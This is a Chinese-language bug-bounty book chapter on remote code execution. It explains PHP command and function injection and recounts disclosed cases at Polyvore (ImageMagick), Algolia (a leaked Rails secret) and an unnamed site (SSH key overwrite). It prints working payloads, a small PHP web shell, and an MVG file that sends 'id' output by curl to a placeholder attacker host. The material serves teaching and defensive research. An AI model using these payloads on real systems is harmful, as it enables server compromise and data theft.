## 第十二章：**远程代码执行**

![Image](img/common.jpg)

*远程代码执行（RCE）*漏洞发生在应用程序使用未经清理的用户控制输入时。RCE 通常通过两种方式之一被利用。第一种是通过执行 shell 命令。第二种是通过执行该易受攻击应用程序使用或依赖的编程语言中的函数。

### 执行 Shell 命令

你可以通过执行应用程序没有清理的 shell 命令来进行 RCE。*shell*为操作系统的服务提供了命令行访问权限。例如，假设站点*www.<example>.com*的设计目的是 ping 一个远程服务器，以确认服务器是否可用。用户可以通过提供一个域名给`domain`参数来触发此操作，URL 形式为`www.<example>.com?domain=`，站点的 PHP 代码按如下方式处理该输入：

```
➊ $domain = $_GET[domain];

   echo shell_exec(➋"ping -c 1 $domain");
```

访问*www.<example>.com?domain=google.com*会将值`google.com`分配给变量`$domain`，如➊所示，然后将该变量作为`ping`命令的参数直接传递给`shell_exec`函数，如➋所示。`shell_exec`函数执行 shell 命令并将完整的输出作为字符串返回。

此命令的输出类似于以下内容：

```
PING google.com (216.58.195.238) 56(84) bytes of data.

64 bytes from sfo03s06-in-f14.1e100.net (216.58.195.238): icmp_seq=1 ttl=56 time=1.51 ms

--- google.com ping statistics ---

1 packets transmitted, 1 received, 0% packet loss, time 0ms

rtt min/avg/max/mdev = 1.519/1.519/1.519/0.000 ms
```

响应的详细信息不重要：只需知道`$domain`变量直接传递给`shell_exec`命令，而没有经过清理。在 bash 中，这是一个常用的 shell，你可以使用分号将多个命令串联起来。因此，攻击者可以访问 URL *www.<example>.com?domain=google.com;id*，`shell_exec`函数将执行`ping`和`id`命令。`id`命令会输出当前在服务器上执行命令的用户信息。例如，输出可能如下所示：

```
➊ PING google.com (172.217.5.110) 56(84) bytes of data.

   64 bytes from sfo03s07-in-f14.1e100.net (172.217.5.110):

   icmp_seq=1 ttl=56 time=1.94 ms

   --- google.com ping statistics ---

   1 packets transmitted, 1 received, 0% packet loss, time 0ms

   rtt min/avg/max/mdev = 1.940/1.940/1.940/0.000 ms

➋ uid=1000(yaworsk) gid=1000(yaworsk) groups=1000(yaworsk)
```

服务器执行了两个命令，因此`ping`命令的响应显示了➊以及`id`命令的输出。`id`命令的输出➋表明网站在服务器上以名为`yaworsk`的用户身份运行应用，且该用户的`uid`为`1000`，属于`gid`和组`1000`，组名也是`yaworsk`。

`yaworsk`用户的权限决定了这个 RCE 漏洞的严重性。在这个例子中，攻击者可以使用命令`；cat FILENAME`（其中 FILENAME 是要读取的文件）读取站点的代码，并可能向某些目录写入文件。如果该站点使用数据库，攻击者很可能还可以导出数据库。

如果一个网站在没有清理用户控制的输入的情况下信任它，就会发生这种类型的远程代码执行（RCE）。解决这个漏洞的方法很简单。在 PHP 中，网站开发者可以使用`escapeshellcmd`，它会转义字符串中的任何可能让 shell 执行任意命令的字符。因此，URL 参数中附加的任何命令都会被视为一个转义值。这意味着`google.com\;id`将被传递给`ping`命令，导致错误`ping: google.com;id: Name or service not known`。

尽管特殊字符会被转义以避免执行额外的任意命令，但请记住，`escapeshellcmd`并不会阻止你传递命令行标志。*标志*是一个可选参数，用来改变命令的行为。例如，`-0`是一个常用的标志，用于定义一个文件，以便命令生成输出时写入该文件。传递标志可能会改变命令的行为，从而可能导致 RCE 漏洞。由于这些细微差别，防止 RCE 漏洞可能会很棘手。

### 执行函数

你还可以通过执行函数来进行远程代码执行。例如，如果*www.<example>.com*允许用户通过 URL 创建、查看和编辑博客文章，例如*www.<example>.com?id=1&action=view*，执行这些操作的代码可能如下所示：

```
➊ $action = $_GET['action'];

   $id = $_GET['id'];

➋ call_user_func($action, $id);
```

这里网站使用了 PHP 函数`call_user_func` ➋，该函数将第一个参数作为函数调用，并将剩余的参数作为该函数的参数传递。在这种情况下，应用程序将调用分配给`action`变量的`view`函数 ➊，并将`1`传递给该函数。这个命令应该显示第一篇博客文章。

但是，如果恶意用户访问 URL *www.<example>.com?id=/etc/passwd &action=file_get_contents*，那么这段代码会被解析为：

```
$action = $_GET['action']; //file_get_contents

$id = $_GET['id']; ///etc/passwd

call_user_func($action, $id); //file_get_contents(/etc/passwd);
```

传递`file_get_contents`作为操作参数会调用该 PHP 函数，将文件内容读取到一个字符串中。在这种情况下，文件*/etc/passwd*作为`id`参数传递。然后，*/etc/passwd*作为参数传递给`file_get_contents`，导致文件被读取。攻击者可以利用这个漏洞读取整个应用的源代码，获取数据库凭证，在服务器上写文件，等等。这样输出的结果就不再是第一篇博客文章，而是如下所示：

```
root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync
```

如果传递给`action`参数的函数没有经过清理或过滤，攻击者还可以通过 PHP 函数调用 shell 命令，例如`shell_exec`、`exec`、`system`等。

### 提升远程代码执行的策略

两种类型的 RCE（远程代码执行）都可能引发各种效果。当攻击者能够执行任何编程语言的函数时，他们可能会将漏洞升级为执行 Shell 命令。执行 Shell 命令通常更为严重，因为攻击者可能会攻陷整个服务器，而不仅仅是应用程序。漏洞的严重程度取决于服务器用户的权限，或者攻击者是否能够利用其他漏洞提升用户权限，这通常被称为*本地权限提升（LPE）*。

尽管本书无法对本地权限提升（LPE）进行详细解释，但你只需要知道，LPE 通常通过利用内核漏洞、以 root 身份运行的服务或*设置用户 ID（SUID）*可执行文件来发生。*内核*是计算机的操作系统。利用内核漏洞可能使攻击者提升权限，执行他们原本无法授权的操作。在攻击者无法利用内核漏洞的情况下，他们可能尝试利用以 root 身份运行的服务。通常情况下，服务不应以 root 身份运行；这种漏洞通常发生在管理员忽视安全性考虑，启动服务时使用了 root 用户身份。如果管理员的账户被攻破，攻击者就能访问以 root 身份运行的服务，而服务执行的任何命令都会拥有提升后的 root 权限。最后，攻击者还可能利用 SUID，它允许用户以指定用户的权限执行文件。尽管 SUID 旨在增强安全性，但当配置错误时，它可能允许攻击者以提升的权限执行命令，这与以 root 身份运行的服务类似。

鉴于用于托管网站的操作系统、服务器软件、编程语言、框架等的多样性，不可能详细列出所有可能的函数注入或 Shell 命令注入方式。但仍然存在一些模式，可以帮助你发现潜在的 RCE 漏洞，即使没有看到应用程序代码。在第一个例子中，一个警示信号是该网站执行了`ping`命令，这是一个系统级别的命令。

在第二个例子中，`action`参数是一个警示信号，因为它允许你控制在服务器上执行的功能。当你在寻找这些线索时，注意观察传递给网站的参数和值。你可以通过传递系统操作或特殊命令行字符，如分号或反引号，来轻松测试这种行为，替代预期值填入参数中。

另一个常见的应用级 RCE 原因是无约束的文件上传，服务器在访问时会执行这些文件。例如，如果一个 PHP 网站允许你上传文件到工作区，但没有限制文件类型，你可以上传一个 PHP 文件并访问它。因为一个脆弱的服务器无法区分应用程序的合法 PHP 文件和你上传的恶意文件，所以该文件会被解释为 PHP 并执行其内容。以下是一个允许你通过 URL 参数`super_secret_web_param`执行 PHP 函数的文件示例：

```
$cmd = $_GET['super_secret_web_param'];

system($cmd);
```

如果你将这个文件上传到*www.<example>.com*并通过*www.<example>.com/files/shell.php*访问它，你可以通过添加带有函数的参数来执行系统命令，例如`?super_secret_web_param='ls'`。这样做会输出*files*目录的内容。在测试此类漏洞时要特别小心，并非所有的赏金项目都希望你在他们的服务器上执行自己的代码。如果你确实上传了类似的 shell，务必删除它，以防其他人发现并恶意利用它。

更复杂的 RCE 示例通常是由于细微的应用行为或编程错误所致。事实上，这些示例在第八章中已有讨论。Orange Tsai 的 Uber Flask Jinja2 模板注入（第 74 页）是一个 RCE，允许他使用 Flask 模板语言执行自己的 Python 函数。我的 Unikrn Smarty 模板注入（第 78 页）则允许我利用 Smarty 框架执行 PHP 函数，包括`file_get_contents`。鉴于 RCE 的多样性，本文将重点介绍一些比之前章节中看到的更传统的示例。

### Polyvore ImageMagick

**难度：** 中等

**网址：** *[Polyvore.com](http://Polyvore.com)*（雅虎收购）

**来源：** *[`nahamsec.com/exploiting-imagemagick-on-yahoo/`](http://nahamsec.com/exploiting-imagemagick-on-yahoo/)*

**报告日期：** 2016 年 5 月 5 日

**支付赏金：** $2,000

查看在广泛使用的软件库中披露的漏洞，可以有效地发现使用该软件的网站中的 bug。ImageMagick 是一个常见的图形处理库，处理图像并且在大多数，甚至是所有主要编程语言中都有实现。这意味着，ImageMagick 库中的 RCE 漏洞可能对依赖该库的网站造成毁灭性影响。

2016 年 4 月，ImageMagick 的维护者公开披露了库更新，修复了关键性漏洞。更新显示，ImageMagick 未能以多种方式正确清理输入。这些漏洞中最危险的一个导致了通过 ImageMagick 的`delegate`功能触发 RCE，`delegate`功能用于通过外部库处理文件。以下代码通过将用户控制的域名作为占位符%M 传递给`system()`命令实现这一点：

```
"wget" -q -O "%o" "https:%M"
```

在使用之前，该值没有被净化，因此提交`https://`example`.com";|ls "-la`将转化为：

```
wget -q -O "%o" "https://example.com";|ls "-la"
```

如同早期涉及将额外命令链到`ping`的 RCE 示例一样，这段代码通过使用分号将额外的命令行功能链到预定功能。

`delegate`功能可以被允许外部文件引用的图像文件类型滥用。例子包括 SVG 和 ImageMagick 定义的文件类型 MVG。当 ImageMagick 处理图像时，它会尝试根据文件内容而不是扩展名来猜测文件类型。例如，如果开发人员试图通过允许应用程序仅接受以*.jpg*结尾的用户文件来净化用户提交的图像，攻击者可以通过将*.mvg*文件重命名为*.jpg*来绕过净化。应用程序会认为该文件是安全的*.jpg*文件，但 ImageMagick 会根据文件内容正确识别该文件类型为 MVG。这将允许攻击者滥用 ImageMagick 的 RCE 漏洞。用于滥用此 ImageMagick 漏洞的恶意文件示例可以在*[`imagetragick.com/`](https://imagetragick.com/)*找到。

在此漏洞公开披露并且网站有机会更新其代码后，Ben Sadeghipour 开始寻找使用未修补版本 ImageMagick 的网站。作为他的第一步，Sadeghipour 在自己的服务器上重新创建了这个漏洞，以确认他有一个有效的恶意文件。他选择使用来自*[`imagetragick.com/`](https://imagetragick.com/)*的示例 MVG 文件，但他本来也可以使用 SVG 文件，因为这两者都引用了外部文件，这些外部文件将触发 ImageMagick 的`delegate`功能。以下是他的代码：

```
   push graphic-context

   viewbox 0 0 640 480

➊ image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id | curl\

     http://SOMEIPADDRESS:8080/ -d @- > /dev/null`'

   pop graphic-context
```

这个文件的重要部分是➊处的那一行，其中包含恶意输入。让我们来分解它。攻击的第一部分是*https://127.0.0.1/x.php?x=*。这是 ImageMagick 在其委托行为中期望的远程 URL。Sadeghipour 随后添加了`` `id ``。在命令行中，反引号（`` ` ``）表示 Shell 应在主命令之前处理的输入。这确保了 Sadeghipour 的有效负载（下一步描述的内容）被立即处理。

管道符号（`|`）将一个命令的输出传递给下一个命令。在这种情况下，`id`的输出被传递给`curl http://`SOMEIPADDRESS`:8080/ -d @-`。cURL 库用于发起远程 HTTP 请求，在此情况下，它向 Sadeghipour 的 IP 地址发起请求，该地址在端口 8080 上监听。`-d`标志是 cURL 的选项，用于将数据作为`POST`请求发送。`@`指示 cURL 按原样使用输入，不进行其他处理。连字符（`–`）表示将使用标准输入。当所有这些语法与管道符号（`|`）结合时，`id`命令的输出将作为`POST`请求体传递给 cURL，且不进行任何处理。最后，`> /dev/null`代码会丢弃命令的任何输出，因此不会打印到漏洞服务器的终端。这有助于防止目标意识到他们的安全性已被破坏。

在上传文件之前，Sadeghipour 启动了一个服务器，通过 Netcat 监听 HTTP 请求，Netcat 是一种常见的网络工具，用于读取和写入连接。他运行了命令`nc -l -n -vv -p 8080`，这允许 Sadeghipour 记录传递到他服务器上的`POST`请求。`-l`标志启用监听模式（接收请求），`-n`防止 DNS 查找，`-vv`启用详细日志记录，`-p 8080`定义了使用的端口。

Sadeghipour 在 Yahoo!网站 Polyvore 上测试了他的有效载荷。在将文件上传到网站作为图片后，Sadeghipour 收到了以下`POST`请求，其中包含在 Polyvore 服务器上执行`id`命令的结果。

```
Connect to [REDACTED] from (UNKNOWN) [REDACTED] 53406

POST / HTTP/1.1

User-Agent: [REDACTED]

Host: [REDACTED]

Accept: /

Content-Length: [REDACTED]

Content-Type: application/x-www-form-urlencoded

uid=[REDACTED] gid=[REDACTED] groups=[REDACTED]
```

这个请求意味着 Sadeghipour 的 MVG 文件成功执行，导致漏洞网站执行了`id`命令。

#### *收获*

Sadeghipour 的漏洞有两个重要的收获。首先，了解已披露的漏洞为你提供了测试新代码的机会，正如前几章所提到的。如果你在测试大型库时，还需要确保你测试的网站公司正在适当管理其安全更新。有些程序会要求你在披露后的一定时间内不要报告未修补的更新，但过了这个时间框架后，你可以自由报告漏洞。第二，在自己的服务器上重现漏洞是一个很好的学习机会。这能确保当你尝试实施它们进行漏洞赏金时，你的有效载荷是有效的。

### Algolia RCE 在[facebooksearch.algolia.com](http://facebooksearch.algolia.com)

**难度：** 高

**网址：** *[facebooksearch.algolia.com](http://facebooksearch.algolia.com)*

**来源：** *[`hackerone.com/reports/134321/`](https://hackerone.com/reports/134321/)*

**报告日期：** 2016 年 4 月 25 日

**奖励金额：** $500

正确的侦查是黑客攻击的重要部分。2016 年 4 月 25 日，Michiel Prins（HackerOne 联合创始人）正在使用工具 Gitrob 对 *[algolia.com](http://algolia.com)* 进行侦查。该工具以一个 GitHub 仓库、个人或组织为种子，爬取与之相关的所有仓库。在所有找到的仓库中，它将根据关键词（如 *password, secret, database* 等）查找敏感文件。

使用 Gitrob，Prins 发现 Algolia 在公共代码库中公开提交了 Ruby on Rails 的 `secret_key_base` 值。`secret_key_base` 帮助 Rails 防止攻击者篡改签名的 cookie，而它应该被隐藏并且永远不应公开分享。通常，这个值会被替换为环境变量 `ENV['SECRET_KEY_BASE']`，只有服务器可以读取。当 Rails 网站使用 cookiestore 来存储会话信息时（我们稍后会讲到），使用 `secret_key_base` 特别重要。因为 Algolia 将该值提交到了公共代码库中，所以 `secret_key_base` 的值仍然可以在 *[`github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12/`](https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12/)* 上查看，但它已不再有效。

当 Rails 对一个 cookie 进行签名时，它会将签名附加到 cookie 的 base64 编码值后面。例如，cookie 和其签名可能看起来像这样：`BAh7B0kiD3Nlc3Npb25faWQGOdxM3M9BjsARg%3D%3D--dc40a55cd52fe32bb3b8`。Rails 会检查双破折号后的签名，以确保 cookie 的开头没有被篡改。当 Rails 使用 cookiestore 时，这一点尤为重要，因为 Rails 默认使用 cookies 及其签名来管理网站会话。用户的信息可以被添加到 cookie 中，并在通过 HTTP 请求提交 cookie 时被服务器读取。由于 cookie 被保存在用户的计算机上，Rails 使用 secret 对其进行签名，以确保其未被篡改。如何读取 cookie 也很重要；Rails 的 cookiestore 会对存储在 cookie 中的信息进行序列化和反序列化。

在计算机科学中，*序列化* 是将对象或数据转换为可以传输和重建的状态的过程。在此情况下，Rails 将会话信息转换为一种格式，以便存储在 cookie 中，并在用户提交 cookie 进行下一次 HTTP 请求时重新读取。序列化之后，cookie 会通过反序列化读取。反序列化过程比较复杂，超出了本书的范围。但如果传递了不可信的数据，它常常会导致 RCE（远程代码执行）。

**注意**

*要了解更多关于反序列化的信息，请参考以下两个非常好的资源：Matthias Kaiser 在* [`www.youtube.com/watch?v=VviY3O-euVQ/`](https://www.youtube.com/watch?v=VviY3O-euVQ/) *上讲的“在 Java 中利用反序列化漏洞”的演讲，以及 Alvaro Muñoz 和 Alexandr Mirosh 在* [`www.youtube.com/watch?v=ZBfBYoK_Wr0/`](https://www.youtube.com/watch?v=ZBfBYoK_Wr0/) *上讲的“13 号星期五 JSON 攻击”的演讲。*

了解 Rails 秘钥后，Prins 能够创建自己有效的序列化对象，并通过 cookie 将其发送到网站进行反序列化。如果存在漏洞，反序列化将导致 RCE。

Prins 使用了一种名为 Rails Secret Deserialization 的 Metasploit 框架漏洞，将此漏洞升级为 RCE。该 Metasploit 漏洞创建了一个 cookie，如果成功反序列化，它将调用反向 shell。Prins 将恶意 cookie 发送给 Algolia，这使得在易受攻击的服务器上启用了 shell。作为概念验证，他运行了`id`命令，返回了`uid=1000(prod) gid=1000(prod) groups=1000(prod)`。他还在服务器上创建了文件*hackerone.txt*来演示这个漏洞。

#### *要点*

在这种情况下，Prins 使用了一个自动化工具来抓取公共仓库中的敏感值。通过执行相同的操作，你也可以发现任何使用可疑关键词的仓库，这些仓库可能会透露出漏洞的线索。利用反序列化漏洞可能非常复杂，但也有一些自动化工具可以简化这一过程。例如，你可以使用 Rapid7 的 Rails Secret Deserialization 来处理较早版本的 Rails，或者使用由 Chris Frohoff 维护的 ysoserial 来处理 Java 的反序列化漏洞。

### 通过 SSH 获取 RCE

**难度：** 高

**URL:** 无

**来源：** *[blog.jr0ch17.com/2018/No-RCE-then-SSH-to-the-box/](http://blog.jr0ch17.com/2018/No-RCE-then-SSH-to-the-box/)*

**报告日期：** 2017 年秋季

**悬赏支付：** 未公开

当目标程序给你提供了一个大范围的测试时，最好自动化资产的发现，然后寻找一些微妙的迹象，判断一个网站是否可能存在漏洞。这正是 Jasmin Landry 在 2017 年秋天所做的。他开始使用工具 Sublist3r、Aquatone 和 Nmap 枚举一个网站的子域名和开放端口。由于他发现了数百个可能的域名，而不可能访问所有域名，他使用了自动化工具 EyeWitness 来对每个域名进行截图。这帮助他在视觉上识别出有趣的网站。

EyeWitness 透露了一个内容管理系统，Landry 觉得它不熟悉，看起来很旧，而且是开源的。Landry 猜测软件的默认凭据可能是 `admin:admin`。测试后成功登录，因此他继续深入研究。这个网站没有任何内容，但审计开源代码时发现该应用以 root 用户身份运行在服务器上。这是一个不好的做法：root 用户可以在网站上执行任何操作，如果应用被攻破，攻击者将获得服务器的完全权限。这也是 Landry 继续挖掘的另一个原因。

接下来，Landry 查找了*已公开的安全问题*或 *CVE*（常见漏洞和暴露）。该站点没有发现任何问题，这对于旧的开源软件来说是不寻常的。Landry 识别出一些不太严重的问题，包括 XSS、CSRF、XXE 和 *本地文件泄露*（能够读取服务器上的任意文件）。所有这些漏洞意味着可能在某个地方存在远程代码执行（RCE）漏洞。

在继续工作时，Landry 注意到一个 API 接口，允许用户更新模板文件。路径是 */api/i/services/site/write-configuration.json?path=/config/sites/test/page/test/config.xml*，并且它通过 `POST` 请求体接受 XML 格式。能够写入文件和定义文件路径是两个重大的红旗。如果 Landry 能在任何文件夹中写入文件，并让服务器将其解释为应用文件，他就能在服务器上执行任意代码，并可能调用系统命令。为了测试这一点，他将路径改为 *../../../../../../../../../../../../tmp/test.txt*。符号 *../* 代表当前路径的上一级目录。所以，如果路径是 */api/i/services*，则 *../* 就是 */api/i*。这让 Landry 可以在任何他想要的文件夹中写入文件。

上传自己的文件成功了，但应用配置不允许他执行代码，因此他需要找到一种替代方式进行远程代码执行（RCE）。他突然想到，*安全套接字协议（SSH）*可以使用公钥认证用户。SSH 访问是管理远程服务器的典型方式：它通过验证远程主机上的公钥，建立安全连接并登录到命令行，公钥存储在 *.ssh/authorized_keys* 目录中。如果他能写入该目录并上传自己的 SSH 公钥，网站将认证他为 root 用户，直接通过 SSH 访问，并拥有服务器的完全权限。

他进行了测试，并成功写入了 *../../../../../../../../../../../../root/.ssh/authorized_keys*。尝试使用 SSH 访问服务器成功，执行 `id` 命令确认他是 root 用户 `uid=0(root) gid=0(root) groups=0(root)`。

#### *总结*

在大范围寻找漏洞时，枚举子域是非常重要的，因为这为你提供了更多的测试面。Landry 能够使用自动化工具发现一个可疑的目标，并且确认了一些初步的漏洞，表明可能还有更多的漏洞待发现。最值得注意的是，当他最初的文件上传 RCE 尝试失败时，Landry 重新考虑了他的做法。他意识到，他可以利用 SSH 配置漏洞，而不仅仅是报告单一的任意文件写入漏洞。提交一份全面的报告，充分展示其影响，通常会增加你获得的奖励金额。所以，一旦发现漏洞，不要立即停止——继续挖掘。

### 总结

RCE（远程代码执行），和本书中讨论的许多其他漏洞一样，通常发生在用户输入未经过正确清理和处理的情况下。在第一个漏洞报告中，ImageMagick 在将内容传递给系统命令之前没有正确转义。为了发现这个漏洞，Sadeghipour 首先在自己的服务器上重新创建了这个漏洞，然后开始寻找未打补丁的服务器。与此相对，Prins 发现了一个秘密，使他能够伪造签名的 Cookie。最后，Landry 找到了一个方法，可以在服务器上写入任意文件，并利用这个漏洞覆盖 SSH 密钥，从而以 root 身份登录。三个人使用了不同的方法来获取 RCE，但每个人都利用了网站接受未经清理的输入这一点。
